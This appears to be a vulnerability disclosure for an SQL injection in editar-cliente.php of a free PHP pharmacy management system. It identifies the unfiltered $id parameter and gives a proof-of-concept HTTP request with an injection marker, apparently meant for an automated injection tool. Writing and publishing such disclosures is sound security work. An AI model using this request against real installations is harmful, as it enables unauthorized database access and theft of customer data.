# farmacia-in-php has sql injection vulnerability in editar-cliente.php

## supplier
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
editar-cliente.php
## describe
There is an unauthorized SQL injection vulnerability in  editar-cliente.php of farmacia-in-php-system.

Control parameter: **$id**

 The information of the database can be obtained without authorization, and arbitrary commands may be executed. 



## code analysis

The **$id** parameters of th editar-cliente.php are not filtered and concatenated into the SQL statement for execution. This is  sql injection vulnerability.

![image-20241113113847575](https://github.com/user-attachments/assets/e5d773e4-b59e-4e6f-ae60-d5a10c24d4a3)

Inject parameter：$id

## POC

```
GET /editar-cliente.php?id=1* HTTP/1.1
Host: farmacia
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

save as 1.txt

![image-20241113114109303](https://github.com/user-attachments/assets/8b66c333-5b87-4708-a565-d62618351997)